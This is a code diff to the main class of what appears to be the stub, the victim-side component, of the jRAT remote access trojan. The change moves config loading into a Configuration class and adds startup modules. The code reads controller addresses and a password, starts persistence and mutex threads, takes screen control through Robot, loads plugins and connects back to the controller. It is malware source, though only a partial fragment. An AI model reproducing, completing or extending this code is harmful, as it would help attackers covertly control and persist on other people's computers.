@@ -2,6 +2,7 @@ package io.jrat.stub;
 
 import io.jrat.common.OperatingSystem;
 import io.jrat.common.crypto.Crypto;
+import io.jrat.stub.modules.startup.StartupModules;
 import io.jrat.stub.utils.Utils;
 
 import java.awt.GraphicsDevice;
@@ -10,108 +11,62 @@ import java.awt.Robot;
 import java.awt.SystemTray;
 import java.awt.TrayIcon;
 import java.io.File;
-import java.io.InputStream;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.PrivateKey;
 import java.security.PublicKey;
 import java.util.Date;
-import java.util.HashMap;
 
 import javax.swing.ImageIcon;
-
 
 public class Main {
 
 	public static String[] addresses;
 	public static String id;
 	public static String pass;
+	public static long reconnectSeconds;
+	public static String name;
+	public static boolean running = true;
+	public static String date;
+	public static int timeout;
+	public static boolean errorLogging = false;
+	public static boolean debugMessages = true;
+	public static TrayIcon icon;
+
 	
 	public static byte[] aesKey;
 	public static KeyPair rsaPair;
 	
-	public static long reconnectSeconds;
-	public static String name;
-	public static boolean running = true;
 	public static Robot robot;
-	public static String date;
-	public static int timeout;
-	public static TrayIcon icon;
-	public static HashMap<String, String> config;
+	
 	public static Robot[] robots;
-	public static boolean errorLogging = false;
-	public static boolean debugMessages = true;
+
 	public static boolean encryption = true;
 
 	public static void main(String[] args) {
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
-				System.setProperty("apple.awt.UIElement", "true");
-			}
+			StartupModules.execute(Configuration.getConfig());
 
 			robot = new Robot();
 
-			InputStream keyFileInputStream = Main.class.getResourceAsStream("/key.dat");
-			byte[] keyBuffer = new byte[keyFileInputStream.available()];
-			keyFileInputStream.read(keyBuffer);
-			byte[] key = keyBuffer;
-
-			InputStream configFileInputStream = Main.class.getResourceAsStream("/config.dat");
-			byte[] configBuffer = new byte[configFileInputStream.available()];
-			configFileInputStream.read(configBuffer);
-			String rawConfigFile = new String(Crypto.decrypt(configBuffer, key));
-
 			File filetodelete = null;
 
-			config = new HashMap<String, String>();
+			addresses = Configuration.getConfig().get("addresses").split(",");
+			id = Configuration.getConfig().get("id");
+			pass = Configuration.getConfig().get("pass");
+			reconnectSeconds = Long.parseLong(Configuration.getConfig().get("reconsec"));
+			name = Configuration.getConfig().get("name");
+			errorLogging = Boolean.parseBoolean(Configuration.getConfig().get("error"));
+			debugMessages = Boolean.parseBoolean(Configuration.getConfig().get("debugmsg"));
 
-			String[] configr = rawConfigFile.trim().split("SPLIT");
-
-			for (int i = 0; i < configr.length; i++) {
-				String str = configr[i];
-				String ckey = str.substring(0, str.indexOf("=")).trim();
-
-				String cval = str.substring(str.indexOf("=") + 1, str.length()).trim();
-
-				config.put(ckey, cval);
+			if (Boolean.parseBoolean(Configuration.getConfig().get("mutex"))) {
+				new Mutex(Integer.parseInt(Configuration.getConfig().get("mport"))).start();
 			}
 
-			addresses = config.get("addresses").split(",");
-			id = config.get("id");
-			pass = config.get("pass");
-			reconnectSeconds = Long.parseLong(config.get("reconsec"));
-			name = config.get("name");
-			errorLogging = Boolean.parseBoolean(config.get("error"));
-			debugMessages = Boolean.parseBoolean(config.get("debugmsg"));
+			
 
-			if (Boolean.parseBoolean(config.get("mutex"))) {
-				new Mutex(Integer.parseInt(config.get("mport"))).start();
-			}
-
-			String allowedOperatingSystems = config.get("os");
-
-			boolean shutdown = true;
-
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && allowedOperatingSystems.contains("win")) {
-				shutdown = false;
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX && allowedOperatingSystems.contains("mac")) {
-				shutdown = false;
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX && allowedOperatingSystems.contains("linux")) {
-				shutdown = false;
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.FREEBSD && allowedOperatingSystems.contains("freebsd")) {
-				shutdown = false;
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OPENBSD && allowedOperatingSystems.contains("openbsd")) {
-				shutdown = false;
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.SOLARIS && allowedOperatingSystems.contains("solaris")) {
-				shutdown = false;
-			}
-
-			if (shutdown) {
-				System.exit(0);
-			}
-
-			if (Boolean.parseBoolean(config.get("timeout"))) {
-				timeout = Integer.parseInt(config.get("toms"));
+			if (Boolean.parseBoolean(Configuration.getConfig().get("timeout"))) {
+				timeout = Integer.parseInt(Configuration.getConfig().get("toms"));
 			} else {
 				timeout = 1000 * 15;
 			}
@@ -160,11 +115,11 @@ public class Main {
 				e1.printStackTrace();
 			}
 
-			if (Boolean.parseBoolean(config.get("ti"))) {
+			if (Boolean.parseBoolean(Configuration.getConfig().get("ti"))) {
 				if (SystemTray.isSupported()) {
 					try {
 						SystemTray tray = SystemTray.getSystemTray();
-						icon = new TrayIcon(new ImageIcon(Main.class.getResource("/icon.png")).getImage(), config.get("tititle"), null);
+						icon = new TrayIcon(new ImageIcon(Main.class.getResource("/icon.png")).getImage(), Configuration.getConfig().get("tititle"), null);
 						tray.add(icon);
 					} catch (Exception e) {
 						e.printStackTrace();
@@ -172,8 +127,8 @@ public class Main {
 				}
 			}
 
-			if (Boolean.parseBoolean(config.get("per"))) {
-				new Persistance(Integer.parseInt(config.get("perms"))).start();
+			if (Boolean.parseBoolean(Configuration.getConfig().get("per"))) {
+				new Persistance(Integer.parseInt(Configuration.getConfig().get("perms"))).start();
 			}
 
 			GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
@@ -185,7 +140,7 @@ public class Main {
 			for (Plugin plugin : Plugin.list) {
 				plugin.methods.get("onstart").invoke(plugin.instance, new Object[] {});
 			}
-			
+
 			new Thread(new Connection()).start();
 		} catch (Exception ex) {
 			ex.printStackTrace();
@@ -227,10 +182,10 @@ public class Main {
 			KeyPair kp = kpg.genKeyPair();
 			PublicKey publicKey = kp.getPublic();
 			PrivateKey privateKey = kp.getPrivate();
-			
+
 			rsaPair = new KeyPair(publicKey, privateKey);
 		}
-		
+
 		return rsaPair;
 	}
 
